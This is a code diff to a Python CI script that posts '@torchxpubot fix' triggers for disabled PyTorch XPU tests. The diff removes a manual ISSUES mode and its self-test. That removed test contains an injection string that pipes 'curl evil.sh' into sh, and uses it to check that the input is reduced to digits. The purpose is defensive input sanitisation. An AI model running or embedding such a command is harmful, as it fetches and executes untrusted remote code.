@@ -6,21 +6,18 @@
 
 Usage:
     GH_TOKEN=<read on SOURCE_REPO, write on TARGET_REPO> \
-        python ci_disabled_queue.py                   # discover, print, post nothing
-    GH_TOKEN=<...> ISSUES="195876 196392" \
-        python ci_disabled_queue.py                   # print the trigger for these
-    GH_TOKEN=<...> DRY_RUN=false [ISSUES=...] \
+        python ci_disabled_queue.py                   # print the trigger, post nothing
+    GH_TOKEN=<...> DRY_RUN=false \
         python ci_disabled_queue.py                   # actually comment
     python ci_disabled_queue.py --self-test
 
 Printing is the default and `DRY_RUN=false` is the only value that posts, since
 the live side comments on a tracking issue and starts a multi-hour GPU job.
 
-`ISSUES` skips discovery entirely: no SOURCE read, no dedup, just the trigger the
-operator asked for. It is the only mode that works while SOURCE is a private repo
-owned by a personal account -- MERGE_TOKEN is a fine-grained PAT, which cannot
-reach those (verified: 404 from the token-access job, with torchxpubot already a
-collaborator). Discovery comes back when SOURCE moves into this repo.
+There is no by-hand mode. A human who wants a specific test fixed now says
+`@torchxpubot fix` on the tracking issue from their own account, which is fewer
+steps than dispatching a workflow. This script exists for the runs nobody
+triggers.
 
 The XPU CI report issue (SOURCE) grows a comment per failing `xpu.yml` commit.
 The ones that matter here carry a `Disable issues:` list of `pytorch/pytorch`
@@ -221,8 +218,8 @@ def next_batch(mirrored):
         sys.exit(
             f"cannot read {SOURCE_REPO}#{SOURCE_ISSUE} (404), so discovery is not "
             f"available: MERGE_TOKEN is a fine-grained PAT and those cannot reach a "
-            f"repo owned by another personal account. Pass ISSUES=<numbers> to queue "
-            f"a batch by hand until the report issue moves into {TARGET_REPO}."
+            f"repo owned by another personal account. Until the report issue moves "
+            f"into {TARGET_REPO}, a human posts `@torchxpubot fix` by hand."
         )
     for comment in comments:
         if comment["created_at"] < START:
@@ -267,20 +264,6 @@ def trigger_body(comment, issues, key):
         ]
     )
 
-
-def explicit_body(issues):
-    """Trigger for an operator-supplied list, with no SOURCE batch behind it."""
-    return "\n".join(
-        [
-            "@torchxpubot fix",
-            "",
-            "These tests are DISABLED upstream and still blocking XPU CI.",
-            "",
-            "Disable issues:",
-            *(f"- `https://github.com/pytorch/pytorch/issues/{n}`" for n in issues),
-            "",
-        ]
-    )
 
 
 def self_test():
@@ -370,13 +353,6 @@ def self_test():
         "re-reported after a reopen is queued again; still-open is deduped"
     )
 
-    # ISSUES is a workflow_dispatch input, so only its digits are trusted.
-    hostile = "195876; curl evil.sh | sh #196392"
-    assert re.findall(r"\d+", hostile) == ["195876", "196392"]
-    explicit = explicit_body(re.findall(r"\d+", hostile))
-    assert explicit.startswith("@torchxpubot fix\n"), "command on the first line"
-    assert "curl" not in explicit and "evil" not in explicit, "nothing else survives"
-    assert disabled_issues(explicit) == ["195876", "196392"]
     print("self-test ok")
 
 
@@ -389,17 +365,12 @@ def main():
         print(f"a fix job is still running ({busy}); nothing queued this round")
         return
 
-    # Digits only: this arrives from a workflow_dispatch input.
-    issues = re.findall(r"\d+", os.environ.get("ISSUES", ""))
-    if issues:
-        body = explicit_body(issues)
-    else:
-        mirrored = last_mirrored()
-        comment, issues, key = next_batch(mirrored)
-        if not comment:
-            print(f"nothing to queue since {START}; {len(mirrored)} mirrored so far")
-            return
-        body = trigger_body(comment, issues, key)
+    mirrored = last_mirrored()
+    comment, issues, key = next_batch(mirrored)
+    if not comment:
+        print(f"nothing to queue since {START}; {len(mirrored)} mirrored so far")
+        return
+    body = trigger_body(comment, issues, key)
 
     # Posting takes the exact string "false" and nothing else, so an unset or
     # misspelled DRY_RUN prints instead of commenting on a live issue.
